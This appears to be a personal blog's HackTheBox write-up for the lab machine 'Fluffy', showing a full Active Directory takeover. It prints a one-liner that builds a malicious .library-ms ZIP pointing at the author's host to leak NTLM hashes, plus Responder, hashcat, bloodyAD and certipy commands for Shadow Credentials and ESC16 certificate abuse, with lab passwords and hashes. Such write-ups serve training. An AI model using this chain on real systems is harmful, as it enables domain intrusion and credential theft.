---
title: HackTheBox | Fluffy | easy 
published: 2025-09-23
description: "In this write-up, I explain how I gained ownership of Fluffy on HackTheBox."
image: "./img/image.png"
tags: [CTF, HTB, write-up, Season8]
category: 'CTF'
draft: false
---

# Summary 

- Initial foothold was achieved through SMB access + malicious ZIP exploit (CVE-2025-24054).
- Enumeration via BloodHound revealed misconfigured rights (GenericAll / GenericWrite) on service accounts.
- Shadow Credentials enabled lateral movement into winrm_svc.
- AD CS misconfiguration (ESC16) allowed escalation to Domain Administrator.
# Recon

I always start HTB machines with a basic nmap scan. It’s quick and provides a lot of useful information. If I get stuck, I usually run more comprehensive scans in the background.

```bash
sudo nmap -sC -sV IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 17:58 +01
Nmap scan report for 10.10.11.69 (10.10.11.69)
Host is up (0.073s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-20 23:58:27Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-20T23:59:48+00:00; +7h00m12s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-09-20T23:59:49+00:00; +7h00m12s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-20T23:59:48+00:00; +7h00m12s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-20T23:59:49+00:00; +7h00m12s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-20T23:59:11
|_  start_date: N/A
|_clock-skew: mean: 7h00m11s, deviation: 0s, median: 7h00m11s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.96 seconds
```

so from the output we see Multiple AD related ports are open, The host found is `DC01.fluffy.htb`, clearly a domain controller in the `fluffy.htb` Active Directory domain.

dont forget to add `10.10.11.69    fluffy.htb    DC01.fluffy.htb    DC01` to your `/etc/hosts`

`j.fleischman / J0elTHEM4n1990!`
## Port 445

With valid credentials, I checked accessible SMB shares:

```sh
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'

[+] IP: 10.10.11.69:445	Name: DC01.fluffy.htb Status: Authenticated
	Disk                                      Permissions	Comment
	----                                      -----------	-------
	ADMIN$                                    NO ACCESS	Remote Admin
	C$                                        NO ACCESS	Default share
	IPC$                                      READ ONLY	Remote IPC
	IT                                        READ, WRITE	
	NETLOGON                                  READ ONLY	Logon server share 
	SYSVOL                                    READ ONLY	Logon server share
```

the `IT` file share look like interesting one lets dig more in it
```sh
smbclient //10.10.11.69/IT -U 'j.fleischman' --password='J0elTHEM4n1990!' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Sep 21 01:18:16 2025
  ..                                  D        0  Sun Sep 21 01:18:16 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025

		5842943 blocks of size 4096. 1976454 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (192.1 KiloBytes/sec) (average 192.1 KiloBytes/sec)
smb: \> 
```

I grabbed the PDF and it's look like instructions to upgrade all systems vulnerable to some cve

![](Season%208%20-%20Fluffy.png)

Did some research to know more, I found **CVE-2025-24054** (previously CVE-2025-24071), which allows **NTLM hash disclosure via `.library-ms` files inside ZIP archives**.
basically when such a file is extracted, Windows Explorer attempts to access a remote SMB path, leaking NTLM authentication.

The IT share already contained extracted ZIP files, which suggested that anything we upload here will automatically be unzipped. but we are not  sure is the machine still vulnerable to that cve

I crafted a malicious `.library-ms` file pointing to my attacker machine:

```bash
echo '<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\10.10.14.134\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>' > document.library-ms && zip exploit.zip document.library-ms && rm document.library-ms
```

Started Responder to capture hashes:

```bash
sudo responder -I tun0 -wvF
```

put the zip file into the share and wait, and we did get some reply : 

![](Season%208%20-%20Fluffy-1.png)
let's try to crack it with `hashcat`
```sh
hashcat ./net-ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

and we got the password
Testing access showed `p.agila` could authenticate over SMB and LDAP
![](Season%208%20-%20Fluffy-2.png)

I dumped data for BloodHound:

```sh
rusthound-ce --domain fluffy.htb -u p.agila -p 'prometheusx-303'
```

![](Season%208%20-%20Fluffy-3.png)
don't forget to do `sudo ntpdate 10.10.11.69` to update your clock

After importing into BloodHound, I saw that **p.agila** had **GenericAll rights over the "service accounts" group**.

![](Season%208%20-%20Fluffy-4.png)

Additionally, `service accounts` had `GenericWrite` rights over several service accounts.

![](Season%208%20-%20Fluffy-5.png)

with winrm_svc we can gain access to the machine and get the user flag

what about the CA_SVC account?? from my little experience with htb labs, i know any certificate account is a valuable target, and here we can see it's a cert publishers

![](Season%208%20-%20Fluffy-6.png)
# access to winrm_svc

with genericWrite over group I used `bloodyAD` to add `p.agila` into the `service accounts` group:
```bash
bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```

then with service accounts access we can do shadow credentiel to get ntlm hash
where did i know about shadow credentiel? with genericWrite rights i searched what i can do with that found this [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write) then from here i've gone to dig deeper in the shadow part [DACL misconfiguration: are your data vulnerable to a Shadow Credentials cyberattack](https://i-tracing.com/blog/dacl-shadow-credentials/)

```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc                                    
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a02d26f1efab476699967579e9038f20'
[*] Adding Key Credential with device ID 'a02d26f1efab476699967579e9038f20' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'a02d26f1efab476699967579e9038f20' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'

```

From there i can Pth to the account and get the flag

![](Season%208%20-%20Fluffy-8.png)

# Path to root

going back to cv_svc account let's grap its ntlm

```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
```

and use the lover certipy to see what we can find

```
certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

ESC16 interesting template may be vulnerable

### Abusing ESC16

this is article have really valuable info about this [AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

let's update cv_svc account to imporsanate administrator
```bash
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

that give us access to request certificates for the `administrator`

```bash
certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

This issued a certificate with administrator privileges.
cleanup :

```bash
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

now let's use the certificate to get the administrator hash
```bash
certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b514
```
and voila

![](Season%208%20-%20Fluffy-9.png)
